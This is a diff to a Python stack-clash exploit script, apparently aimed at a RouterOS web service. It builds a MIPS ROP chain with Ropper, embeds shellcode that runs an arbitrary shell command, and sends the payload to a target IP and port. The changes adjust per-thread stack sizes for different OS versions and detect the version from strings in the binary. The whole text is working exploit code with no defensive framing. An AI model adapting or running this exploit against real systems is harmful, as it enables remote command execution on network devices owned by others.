@@ -13,9 +13,10 @@
 import socket, time, sys, struct, re
 from ropper import RopperService
 
-AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
-SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
-ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!
+AST_STACKSIZE = 0x800000 # default stack size per thread (8 MB)
+ROS_STACKSIZE =  0x20000 # newer version of ROS have a different stack size per thread (128 KB)
+SKIP_SPACE    =   0x1000 # 4 KB of "safe" space for the stack of thread 2
+ROP_SPACE     =   0x8000 # we can send 32 KB of ROP chain!
 
 ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
 ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
@@ -40,6 +41,11 @@ class MyRopper():
             return gadgets
         else:
             raise Exception("Cannot find gadgets!")
+
+    def contains_string(self, string):
+        s = self.rs.searchString(string)
+        t = [a for a in s.values()][0]
+        return len(t) > 0
 
     @staticmethod
     def get_ra_offset(gadget):
@@ -113,10 +119,9 @@ def build_shellcode(shellCmd):
 
     return shell_code
 
-def build_payload(binary, shellCmd):
+def build_payload(binRop, shellCmd):
     ropChain = b''
     shell_code = build_shellcode(shellCmd)
-    binRop = MyRopper(binary)
     
     # 1) Stack finder gadget (to make stack pivot) 
     stack_finder = binRop.get_gadgets("addiu ?a0, ?sp, 0x18; lw ?ra, 0x???(?sp% jr ?ra;")[0]
@@ -213,7 +218,11 @@ if __name__ == "__main__":
         binary   = sys.argv[3]
         shellCmd = sys.argv[4]
 
-        payload = build_payload(binary, shellCmd)
+        binRop = MyRopper(binary)
+        payload = build_payload(binRop, shellCmd)
+
+        if binRop.contains_string("pthread_attr_setstacksize"):
+            AST_STACKSIZE = ROS_STACKSIZE
 
         stackClash(ip, port, payload)
     else:
